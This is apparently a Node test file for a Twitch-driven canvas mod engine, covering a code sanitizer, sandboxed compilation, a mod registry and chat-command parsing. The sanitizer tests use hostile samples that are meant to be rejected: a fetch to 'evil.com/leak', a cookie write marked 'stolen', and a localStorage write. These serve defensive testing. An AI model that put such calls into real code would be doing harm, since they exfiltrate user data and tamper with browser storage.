import test from 'node:test';
import assert from 'node:assert';
import { sanitizeCode, compileSafeMod } from '../src/engine/astSanitizer.js';
import { ModRegistry } from '../src/engine/modRegistry.js';
import { TwitchChatBridge } from '../src/engine/twitchChatBridge.js';

test('AST Sanitizer blocks dangerous JavaScript keywords', () => {
  const badCode1 = `function renderMod(ctx) { fetch('https://evil.com/leak'); }`;
  const result1 = sanitizeCode(badCode1);
  assert.strictEqual(result1.valid, false);
  assert.match(result1.error, /Forbidden API/);

  const badCode2 = `function renderMod() { document.cookie = 'stolen'; }`;
  const result2 = sanitizeCode(badCode2);
  assert.strictEqual(result2.valid, false);

  const badCode3 = `function renderMod() { localStorage.setItem('key', 'val'); }`;
  const result3 = sanitizeCode(badCode3);
  assert.strictEqual(result3.valid, false);
});

test('AST Sanitizer passes safe Canvas render code', () => {
  const safeCode = `
    function renderMod(ctx, canvas, state, time) {
      ctx.fillStyle = '#ff0055';
      ctx.fillRect(10, 10, 100, 100);
    }
  `;
  const result = sanitizeCode(safeCode);
  assert.strictEqual(result.valid, true);
});

test('Safe compilation compiles and executes properly in sandbox', () => {
  const code = `
    function renderMod(ctx, canvas, state) {
      state.count = (state.count || 0) + 1;
    }
  `;
  const fn = compileSafeMod(code);
  assert.strictEqual(typeof fn, 'function');

  const state = {};
  fn(null, null, state);
  assert.strictEqual(state.count, 1);
  fn(null, null, state);
  assert.strictEqual(state.count, 2);
});

test('ModRegistry correctly registers, runs, and reverts mods', () => {
  const registry = new ModRegistry();
  const modCode = `
    function renderMod(ctx, canvas, state) {
      state.rendered = true;
    }
  `;

  const mod = registry.registerMod({
    title: 'Test Mod',
    author: 'Viewer1',
    code: modCode,
    duration: 5000
  });

  assert.strictEqual(registry.activeMods.size, 1);
  assert.strictEqual(registry.activeMods.get(mod.id).title, 'Test Mod');

  // Render cycle
  registry.renderAll(null, null, 1000);
  assert.strictEqual(mod.state.rendered, true);

  // Revert
  const reverted = registry.revertLastMod();
  assert.strictEqual(reverted, true);
  assert.strictEqual(registry.activeMods.size, 0);
});

test('TwitchChatBridge emits messages and parses !mod commands', () => {
  const bridge = new TwitchChatBridge();
  let receivedMsg = null;
  let receivedCmd = null;

  bridge.onMessage((msg) => { receivedMsg = msg; });
  bridge.onCommand((cmd) => { receivedCmd = cmd; });

  bridge.receiveMessage({
    user: 'CyberCoder',
    text: '!mod neon ducks with low gravity'
  });

  assert.strictEqual(receivedMsg.user, 'CyberCoder');
  assert.strictEqual(receivedCmd.command, 'mod');
  assert.strictEqual(receivedCmd.args, 'neon ducks with low gravity');
});
